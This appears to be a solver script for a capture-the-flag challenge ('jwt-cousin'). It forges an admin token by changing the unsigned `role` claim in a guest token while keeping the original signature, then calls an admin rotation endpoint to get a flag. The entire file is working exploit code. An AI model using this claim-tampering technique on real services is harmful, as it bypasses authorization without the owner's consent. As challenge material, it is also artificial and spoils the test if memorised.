#!/usr/bin/env python3
"""
Solver for jwt-cousin.

Path:
  1. Log in as guest -> get a valid token.
  2. Decode the payload (base64url JSON). Note claims: sub, role, exp, v, alg.
  3. Discover (by experiment) that the signature covers only a subset of the
     claims and NOT `role`. So we can rewrite `role` without re-signing:
     keep the guest signature, change only role -> admin, re-encode payload.
  4. Call the admin-only rotation endpoint with the forged token. The server
     performs the admin effect and returns the per-team flag.

Usage:
    python3 solve.py http://HOST:8080
"""
import base64
import json
import sys
import urllib.request


def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64u_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def post(url, data=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        return json.loads(urllib.request.urlopen(req, timeout=15).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8080"

    # 1. login as guest
    r = post(base + "/api/login", {"user": "guest", "pass": "guest"})
    token = r["token"]
    print("[+] guest token:", token)

    payload_b64, sig = token.split(".")
    claims = json.loads(b64u_dec(payload_b64))
    print("[+] claims:", claims)

    # 3. forge: bump role to admin, KEEP the signature (role is not signed)
    claims["role"] = "admin"
    forged_payload = b64u(json.dumps(claims, separators=(",", ":")).encode())
    forged = forged_payload + "." + sig
    print("[+] forged admin token:", forged)

    # 4. trigger the admin effect
    r = post(base + "/api/admin/rotate", token=forged)
    print("[+] rotate response:", r)
    if r.get("flag"):
        print("\nFLAG:", r["flag"])
    else:
        print("\n[!] no flag -- forge failed:", r)
        sys.exit(1)


if __name__ == "__main__":
    main()
